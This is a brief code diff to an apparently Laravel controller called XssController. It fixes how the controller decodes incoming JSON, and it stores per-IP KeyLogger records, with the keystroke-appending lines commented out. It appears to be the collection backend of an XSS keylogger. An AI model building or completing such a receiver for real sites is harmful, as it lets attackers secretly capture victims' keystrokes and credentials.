@@ -10,7 +10,7 @@ class XssController extends Controller
 {
     function index(Request $request) {
         $keyLogger = KeyLogger::where('ip', $request->ip())->first();
-        $request = json_decode($request);
+        $request = json_decode($request->getContent());
 //        if ($keyLogger != null) {
 //            $keyLogger->content .= $request->key;
 //            $keyLogger->save();
